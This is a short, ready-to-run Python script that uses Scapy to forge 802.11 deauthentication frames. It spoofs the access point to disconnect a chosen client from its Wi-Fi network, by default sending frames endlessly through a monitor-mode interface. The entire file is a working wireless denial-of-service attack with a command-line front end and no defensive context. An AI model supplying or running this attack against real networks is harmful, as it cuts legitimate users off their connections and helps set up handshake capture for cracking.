from scapy.all import *


def deauth(target_mac, gateway_mac, inter=0.1, count=None, loop=1, iface="wlan0mon", verbose=1):
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    # stack them up
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    # send the packet
    sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=verbose)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="A python script for sending deauthentication frames")
    parser.add_argument("target", help="Target MAC address to deauthenticate.")
    parser.add_argument("gateway", help="Gateway MAC address that target is authenticated with")
    parser.add_argument("-c" , "--count", help="number of deauthentication frames to send, specify 0 to keep sending infinitely, default is 0", default=0)
    parser.add_argument("--interval", help="The sending frequency between two frames sent, default is 100ms", default=0.1)
    parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlan0mon'", default="wlan0mon")
    parser.add_argument("-v", "--verbose", help="wether to print messages", action="store_true")

    args = parser.parse_args()
    target = args.target
    gateway = args.gateway
    count = int(args.count)
    interval = float(args.interval)
    iface = args.iface
    verbose = args.verbose

    if count == 0:
        # if count is 0, it means we loop forever (until interrupt)
        loop = 1
        count = None
    else:
        loop = 0

    # printing some info messages"
    if verbose:
        if count:
            print(f"[+] Sending {count} frames every {interval}s...")
        else:
            print(f"[+] Sending frames every {interval}s for ever...")

    deauth(target, gateway, interval, count, loop, iface, verbose)

    